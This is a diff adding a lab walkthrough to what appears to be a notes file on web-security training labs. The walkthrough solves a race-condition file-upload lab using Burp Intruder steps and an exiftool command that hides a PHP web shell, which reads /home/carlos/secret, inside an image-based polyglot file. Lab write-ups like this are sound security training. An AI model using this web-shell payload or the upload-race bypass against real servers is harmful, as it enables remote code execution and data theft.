@@ -122,3 +122,30 @@ exiftool -Comment="<?php echo 'start ' .  system('cat /home/carlos/secret') . ' 
 4. Enjoy RCE
 
 ---
+
+
+```
+Lab: Web shell upload via race condition
+
+EXPERT
+
+This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.
+
+To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+You can log in to your own account using the following credentials: wiener:peter 
+```
+
+1. Intercept POST request > put it in intruder
+2. Intercept GET request > put it in the intruser
+3. Sniper mode, null payload, continue indefinitely
+4. Run both request (POST/GET) in the same time and look the GET request
+
+```bash
+exiftool -Comment="<?php echo 'start ' .  system('cat /home/carlos/secret') . ' END'; ?>" dices.png -o polyglot4.php
+```
+
+3. Upload polyglot4.php
+4. Enjoy RCE
+
+---
